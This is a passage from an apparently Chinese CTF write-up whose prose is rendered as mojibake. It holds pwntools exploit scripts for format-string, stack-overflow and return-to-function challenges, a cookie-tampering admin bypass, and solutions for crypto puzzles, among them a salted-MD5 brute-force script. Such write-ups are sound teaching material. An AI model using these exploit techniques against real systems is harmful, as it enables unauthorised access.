çš„æ–‡ä»¶ï¼Œä»è€Œgetshellæ‹¿åˆ°flagï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd5d6ffa0abd.png" alt=""></p><h3 id="webé™„åŠ é¢˜-atom"><a href="#webé™„åŠ é¢˜-atom" class="headerlink" title="webé™„åŠ é¢˜-atom"></a>webé™„åŠ é¢˜-atom</h3><blockquote><p>è¿™é“webåŠ é¤é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯ç”¨ç»™çš„è´¦æˆ·å¯†ç ç™»å½•åå°†cookieä¸­çš„<code>admin=0</code>æ”¹ä¸º<code>admin=1</code>ï¼Œç„¶åä¼šè·³è½¬åˆ°ä¸€ä¸ªåå°ï¼Œç„¶åæŸ¥çœ‹åå°æºç å³å¯å¾—åˆ°çœŸæ­£çš„flagã€‚</p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><blockquote><p>ä¸‰ä¸ªpwnéƒ½éå¸¸ç»å…¸ï¼Œåˆ†åˆ«è€ƒå¯Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç®€å•çš„æº¢å‡ºï¼Œä»¥åŠret2syså‡ ä¸ªçŸ¥è¯†ç‚¹ã€‚</p></blockquote><h3 id="pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h3><p>é€šè¿‡ç”¨IDAç®€å•åœ°åˆ†æä¸€ä¸‹é€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°printfå¤„å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#vuln_funå‡½æ•°ä¼ªcä»£ç </span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-7Ch]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-8h] [ebp-78h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-4h] [ebp-74h]</span>  <span class="token keyword">int</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-70h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-6Ch]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-68h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-64h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-60h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-5Ch]</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-58h]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-54h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-50h]</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-4Ch]</span>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-48h]</span>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-44h]</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-40h]</span>  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-3Ch]</span>  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-38h]</span>  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-34h]</span>  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-30h]</span>  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-28h]</span>  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-24h]</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-20h]</span>  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-1Ch]</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+64h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-4h]</span>  v31 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>    <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    v4<span class="token punctuation">,</span>    v5<span class="token punctuation">,</span>    v6<span class="token punctuation">,</span>    format<span class="token punctuation">,</span>    v8<span class="token punctuation">,</span>    v9<span class="token punctuation">,</span>    v10<span class="token punctuation">,</span>    v11<span class="token punctuation">,</span>    v12<span class="token punctuation">,</span>    v13<span class="token punctuation">,</span>    v14<span class="token punctuation">,</span>    v15<span class="token punctuation">,</span>    v16<span class="token punctuation">,</span>    v17<span class="token punctuation">,</span>    v18<span class="token punctuation">,</span>    v19<span class="token punctuation">,</span>    v20<span class="token punctuation">,</span>    v21<span class="token punctuation">,</span>    v22<span class="token punctuation">,</span>    v23<span class="token punctuation">,</span>    v24<span class="token punctuation">,</span>    v25<span class="token punctuation">,</span>    v26<span class="token punctuation">,</span>    v27<span class="token punctuation">,</span>    v28<span class="token punctuation">,</span>    v29<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//è¦†ç›–gotè¡¨ä¸­fflushæ¡ç›®æŒ‡å‘çš„åœ°å€ï¼Œå°†å…¶æŒ‡å‘read_flagå‡½æ•°</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ç®€å•è¿è¡Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ è¯­å¥ï¼š<code>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</code>ï¼Œç„¶åè¾“å…¥å¾—åˆ°ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd5a6468eaa6.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è¾“å…¥è¢«æ”¾åœ¨äº†printfå‡½æ•°æ ˆä¸­çš„ç¬¬6ä¸ªä½ç½®ï¼ˆè¿™é‡Œçš„%pæ˜¯c/c++ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ï¼‰ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ€ä¸»è¦çš„å±å®³å°±æ˜¯å¯ä»¥è·å–ä»»æ„åœ°å€å†…å®¹ï¼Œæˆ–è€…å®ç°ä»»æ„åœ°å€å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™å°±æ˜¯é€šè¿‡ä»»æ„åœ°å€å†™ï¼Œæ¥è¦†ç›–gotè¡¨ï¼Œä¹‹å‰çš„<a href="https://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/">ç»ƒä¹ è®°å½•</a>ä¸­å°±æåˆ°äº†è¿™äº›çŸ¥è¯†ã€‚</p><p>æ—¢ç„¶çŸ¥é“äº†åˆ©ç”¨ä½ç½®ï¼Œé‚£ä¹ˆç›´æ¥åˆ©ç”¨pwntoolsæ„é€ expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#io = process('./200')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./200'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20010'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read_flag_addr = 0x0804859B</span>read_flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read_flag'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = 0x0804A034</span>got_printf_addr <span class="token operator">=</span> <span class="token number">0x0804A00c</span>got_fflush_addr <span class="token operator">=</span> <span class="token number">0x0804A010</span><span class="token comment" spellcheck="true">#è¦†ç›–fflushåœ°å€æŒ‡å‘çš„å†…å®¹ï¼Œä»è€Œå®ç°read_flagè·³è½¬</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>got_fflush_addr<span class="token punctuation">:</span> <span class="token number">0x0804859B</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>expæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd5919f74fc3.png" alt=""></p><h3 id="pwn2â€“æ ˆæº¢å‡º"><a href="#pwn2â€“æ ˆæº¢å‡º" class="headerlink" title="pwn2â€“æ ˆæº¢å‡º"></a>pwn2â€“æ ˆæº¢å‡º</h3><blockquote><p>ç®€å•çš„æ ˆæº¢å‡ºå•¦ï¼Œå¾ˆå¸¸è§çš„ï¼Œæ‰¾åˆ°æº¢å‡ºç‚¹ç„¶åæŠŠEIPæŒ‡å‘æˆ‘ä»¬çš„<code>win</code>å‡½æ•°åœ°å€å³å¯:</p><p><img src="https://i.loli.net/2018/10/28/5bd5a81b27580.png" alt=""></p><p>é€šè¿‡<code>gdb-peda</code>,patternæ¨¡å—ï¼Œæ‰¾åˆ°æº¢å‡ºåç§»é‡ä¸º76ï¼Œä¹Ÿå°±æ˜¯è¯´åªéœ€è¦æ„é€ <code>76*&#39;a&#39; + win_addr</code>å³å¯:</p><p><img src="https://i.loli.net/2018/10/28/5bd5a40fae3f4.png" alt=""></p></blockquote><p>æ„é€ exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#idaä¸­æœ‰winå‡½æ•°çš„åœ°å€</span>win_addr <span class="token operator">=</span> <span class="token number">0x08048488</span><span class="token comment" spellcheck="true">#io = process('101.231.137.47',20011)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./100'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">76</span><span class="token operator">*</span><span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœ(å› ä¸ºç¯å¢ƒå·²ç»å…³é—­ï¼Œæ‰€ä»¥åªèƒ½å±•ç¤ºæœ¬åœ°æ•ˆæœ):</p><p><img src="https://i.loli.net/2018/10/28/5bd5a99272847.png" alt=""></p><h3 id="pwn3â€“ret2syscall"><a href="#pwn3â€“ret2syscall" class="headerlink" title="pwn3â€“ret2syscall"></a>pwn3â€“ret2syscall</h3><blockquote><p>pwn3çš„è¯ç¨å¾®æ¯”ä¸Šé¢ä¸¤é¢˜è¦éš¾ä¸Šä¸€ç‚¹ç‚¹ï¼Œä¸è¿‡è¿˜åœ¨æˆ‘è¿™ä¸ªèŒæ–°çš„æ‰¿å—èŒƒå›´ä¹‹å†…ï¼Œå…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤æªæ–½ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd5ab2b01106.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°åªæ˜¯å¼€äº†æ ˆä¸å¯æ‰§è¡Œ ï¼ˆNX)ï¼Œé™æ€åˆ†æä¸€æ³¢:</p><p><img src="https://i.loli.net/2018/10/28/5bd5ab68bccdf.png" alt=""></p><p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ªwin_funcå‡½æ•°ï¼ŒçŒœæµ‹åŒæ ·æ˜¯åˆ©ç”¨è¿”å›åˆ°è¯¥å‡½æ•°ä»è€Œå¾—åˆ°flagï¼Œé‚£ä¹ˆå¦‚ä½•è¿”å›åˆ°è¿™ä¸ªwin_funcå‡½æ•°å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ³¨æ„åˆ°mem_testå‡½æ•°ä¼ªcä»£ç å¦‚ä¸‹:</p><p><img src="https://i.loli.net/2018/10/28/5bd5bef61db2e.png" alt=""></p><p>ç›´æ¥<code>return result</code>ï¼Œé‚£ä¹ˆå¦‚æœæœ‰æº¢å‡ºå­˜åœ¨ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½è¦†ç›–æ‰è¿™ä¸ªå‡½æ•°çš„è¿”å›åœ°å€å‘¢ï¼Œé‚£å½“ç„¶æ˜¯å¯è¡Œçš„(è¿™é¢˜ä¸èƒ½ç›´æ¥ç”¨pattern createå¾—åˆ°åç§»é‡ï¼Œå¦‚æœpatternè¿‡å¤§åˆ™ä¼šå¯¼è‡´æ— æ³•è¦†ç›–eipï¼‰ï¼Œç”¨gdbåœ¨mem_testå‡½æ•°ä¸‹æ–­ç‚¹è°ƒè¯•ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd5cdf24a4fa.png" alt=""></p><p>ç„¶åæ ¹æ®ä¹‹å‰idaåˆ†æå˜é‡sçš„ä½ç½®ä¸º<code>ebp-0x13</code>,æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ<code>ebp = 0xffffd145 +0x13 = 0xffffd158</code>ï¼Œæˆ–è€…ç›´æ¥åœ¨gdbçœ‹ebpçš„å€¼ï¼Œå¯ä»¥çŸ¥é“<code>0x8048718</code>å°±æ˜¯returnè¿”å›çš„åœ°å€ã€‚æˆ‘ä»¬éœ€è¦å°†å®ƒè¦†ç›–æˆwin_funcçš„åœ°å€ã€‚</p><p><img src="https://i.loli.net/2018/10/28/5bd5cec20e1ef.png" alt=""></p><p>è€Œcatflagåœ°å€å°±æ˜¯ä¸€å¼€å§‹è¾“å‡ºçš„é‚£ä¸ªhint:<code>0x080487E0</code></p></blockquote><p>æ„é€ expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./memory"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token comment" spellcheck="true">#io = process("./memory")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20012'</span><span class="token punctuation">)</span>catflag <span class="token operator">=</span> <span class="token number">0x080487E0</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_func'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#paddingç”±æ ˆç©ºé—´å’Œebp(0x13+4)ç»„æˆï¼Œsystem('cat flag')ç”±systemå‡½æ•°å’Œcatflagå‚æ•°ä»¥åŠsystemè¿”å›åœ°å€ç»„æˆ</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0x08048677</span><span class="token punctuation">,</span> catflag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd592283dd2f.png" alt=""></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚"><a href="#Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚" class="headerlink" title="Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚"></a>Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚</h3><blockquote><p>é¢˜é¢æœ‰ä¸€ä¸²base64ï¼šVTBzNE9GZEhURWhDVjBveFVrMVVTell4UkRKWU5FTTFRMGszUmtrd1ZFVT0=</p><p>è¿ç»­è§£ç å³å¯å¾—åˆ°ï¼šSK88WGLHBWJ1RMTK61D2X4C5CI7FI0TE</p><p>æäº¤å³å¯ã€‚</p></blockquote><h3 id="Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç "><a href="#Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç " class="headerlink" title="Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç "></a>Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç </h3><blockquote><p>æ®è¯´æ˜¯æŸå¹³å°åŸé¢˜ï¼Œç”šè‡³ä¸“é—¨å»æŸ¥äº†ä¸€ä¸‹äºŒæˆ˜æ—¶æœŸçš„å¯†ç å­¦ï¼Œé¢˜é¢ï¼š</p><pre class=" language-c"><code class="language-c">å·²çŸ¥å°†ä¸€ä¸ªflagä»¥ä¸€ç§åŠ å¯†å½¢å¼ä¸ºä½¿ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œä½¿ç”¨å¯†é’¥WELCOMETOCFFåŠ å¯†åå¯†æ–‡ä¸º<span class="token number">000000000000000000000000000000000000000000000000000101110000110001000000101000000001</span>ï¼Œè¯·åˆ†æå‡ºflag</code></pre><p>WELCOMETOCFFä¸ºå¯†é’¥ï¼Œé•¿åº¦ä¸º12ï¼Œè€ŒäºŒè¿›åˆ¶ä¸²é•¿åº¦ä¸º84ï¼Œæ—¢ç„¶å¯†æ–‡ä¸ºäºŒè¿›åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥æƒ³åˆ°çš„æ¯”è¾ƒç®€å•çš„åŠ å¯†æ“ä½œå°±æ˜¯æŒ‰ä½ä¸ï¼ŒæŒ‰ä½æˆ–ï¼Œä»¥åŠæŒ‰ä½å¼‚æˆ–ã€‚</p><p>å°è¯•åå‘ç°æ˜¯å¼‚æˆ–æ“ä½œï¼Œå°†WELCOMETOCFFï¼Œåˆ†åˆ«ç”¨ä¸ƒä½äºŒè¿›åˆ¶è¡¨ç¤ºå…¶åœ¨å­—æ¯è¡¨ä¸­çš„é¡ºåºï¼Œå¹¶ä¸”æ¯å¯¹åº”çš„ä¸ƒä½è¿›è¡Œå¼‚æˆ–æ“ä½œï¼š</p><pre class=" language-c"><code class="language-c">å¯†æ–‡<span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0010111</span> <span class="token number">0000110</span> <span class="token number">0010000</span> <span class="token number">0010100</span> <span class="token number">0000001</span>XORå¯†é’¥W E L C O M E T O C F F<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0010100</span> <span class="token number">0001111</span> <span class="token number">0000011</span> <span class="token number">0000110</span> <span class="token number">0000110</span>å¾—åˆ°ï¼š<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0000011</span> <span class="token number">0001001</span> <span class="token number">0010011</span> <span class="token number">0010010</span> <span class="token number">0000111</span>W E L C O M E C I S R G<span class="token operator">==</span><span class="token operator">></span> flag<span class="token punctuation">{</span>WELCOMECISRG<span class="token punctuation">}</span></code></pre><p>æäº¤å³å¯ã€‚</p></blockquote><h3 id="Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç "><a href="#Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç " class="headerlink" title="Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç "></a>Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç </h3><blockquote><p>æ‘©æ–¯ç”µç è§£ç å³å¯ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd5dc8906c6b.png" alt=""></p><p>flag:JRQ058XMGC1I7PB4UNGA7BLNBCMS6YJ0</p></blockquote><h3 id="Crypto4-å‡ºèˆªäº†-å‡ºèˆªå•¦ï¼ï¼"><a href="#Crypto4-å‡ºèˆªäº†-å‡ºèˆªå•¦ï¼ï¼" class="headerlink" title="Crypto4-å‡ºèˆªäº†~å‡ºèˆªå•¦ï¼ï¼"></a>Crypto4-å‡ºèˆªäº†~å‡ºèˆªå•¦ï¼ï¼</h3><blockquote><p>æ ¹æ®é¢˜é¢ï¼Œå°è¯•è¿›è¡Œå¯¹è¯·æ±‚ç±»å‹è¿›è¡Œè¿‡æ»¤ï¼Œå‘ç°POSTè¯·æ±‚åªæœ‰ä¸€ä¸ªï¼Œå¹¶ä¸”æœ‰useridå’Œpswrdï¼š</p><p><img src="https://i.loli.net/2018/10/29/5bd5dd387aca9.png" alt=""></p><p>å°è¯•å°†pswrdçš„å€¼è§£ç åæäº¤flagï¼ŒæˆåŠŸã€‚</p></blockquote><h3 id="Crypto5-IDCå¯†ç ç ´è§£-æœªè§£å‡º"><a href="#Crypto5-IDCå¯†ç ç ´è§£-æœªè§£å‡º" class="headerlink" title="Crypto5-IDCå¯†ç ç ´è§£(æœªè§£å‡º)"></a>Crypto5-IDCå¯†ç ç ´è§£(æœªè§£å‡º)</h3><blockquote><p>ç»™å‡ºä¸€ä¸²å­—ç¬¦<code>js4163633181327481</code></p><p>å®Œå…¨è„‘æ´é¢˜ï¼šæ‰‹æœºä¹é”®<code>4163633181327481</code>ï¼Œæ²¡ç”¨è¿‡çš„å’‹æ´»ã€‚ã€‚ã€‚</p></blockquote><h3 id="Crypto6-è¶…çº§å¯†ç "><a href="#Crypto6-è¶…çº§å¯†ç " class="headerlink" title="Crypto6-è¶…çº§å¯†ç "></a>Crypto6-è¶…çº§å¯†ç </h3><blockquote><p>è¿™é¢˜ç»™å‡ºäº†å¤§é‡çš„md5å€¼ï¼Œä»¥åŠç±»ä¼¼äºbase64æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¾ˆå®¹æ˜“å°±æƒ³åˆ°hashåŠ ç›(salt)çš„é—®é¢˜ï¼Œè€Œä¸”éšçº¦è®°å¾—ä¹‹å‰åœ¨å“ªçœ‹åˆ°è¿‡è¿™ä¸ªé¢˜ã€‚</p><p>è„šæœ¬çˆ†ç ´ï¼ˆæ—¶é—´åŸå› ï¼Œç›´æ¥ä»1234567880å¼€å§‹ï¼‰ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> numba <span class="token keyword">import</span> jit@jit<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    password <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"f09ebdb2bb9f5eb4fbd12aad96e1e929.p5Zg6LtD"</span><span class="token punctuation">,</span><span class="token string">"6cea25448314ddb70d98708553fc0928.ZwbWnG0j"</span><span class="token punctuation">,</span><span class="token string">"2629906b029983a7c524114c2dd9cc36.1JE25XOn"</span><span class="token punctuation">,</span><span class="token string">"2e854eb55586dc58e6758cfed62dd865.ICKTxe5j"</span><span class="token punctuation">,</span><span class="token string">"7b073411ee21fcaf177972c1a644f403.0wdRCo1W"</span><span class="token punctuation">,</span><span class="token string">"6795d1be7c63f30935273d9eb32c73e3.EuMN5GaH"</span><span class="token punctuation">,</span><span class="token string">"d10f5340214309e3cfc00bbc7a2fa718.aOrND9AB"</span><span class="token punctuation">,</span><span class="token string">"8e0dc02301debcc965ee04c7f5b5188b.uQg6JMcx"</span><span class="token punctuation">,</span><span class="token string">"4fec71840818d02f0603440466a892c9.XY5QnHmU"</span><span class="token punctuation">,</span><span class="token string">"ee8f46142f3b5d973a01079f7b47e81c.zMVNlHOr"</span><span class="token punctuation">,</span><span class="token string">"e4d9e1e85f3880aedb7264054acd1896.TqRhn1Yp"</span><span class="token punctuation">,</span><span class="token string">"0fd046d8ecddefc66203f6539cac486b.AR5lI2He"</span><span class="token punctuation">,</span><span class="token string">"f6326f02adaa31a66ed06ceab2948d01.Aax2fIPl"</span><span class="token punctuation">,</span><span class="token string">"720ba10d446a337d79f1da8926835a49.ZAOYDPR2"</span><span class="token punctuation">,</span><span class="token string">"06af8bcc454229fe5ca09567a9071e62.hvcECKYs"</span><span class="token punctuation">,</span><span class="token string">"79f58ca7a81ae2775c2c2b73beff8644.TgFacoR3"</span><span class="token punctuation">,</span><span class="token string">"46aaa5a7fef5e250a2448a8d1257e9cf.GLYu0NO4"</span><span class="token punctuation">,</span><span class="token string">"2149ac87790dd0fe1b43f40d527e425a.5Xk2O1sG"</span><span class="token punctuation">,</span><span class="token string">"d15a36d8be574ac8fe64689c728c268e.aZikhUEy"</span><span class="token punctuation">,</span><span class="token string">"ff7bced91bd9067834e3ad14cc1464cd.E7UROqXn"</span><span class="token punctuation">,</span><span class="token string">"8cc0437187caf10e5eda345cb6296252.XPin3mVB"</span><span class="token punctuation">,</span><span class="token string">"5cfcdca4a9cb2985a0b688406617689e.nsGqoafv"</span><span class="token punctuation">,</span><span class="token 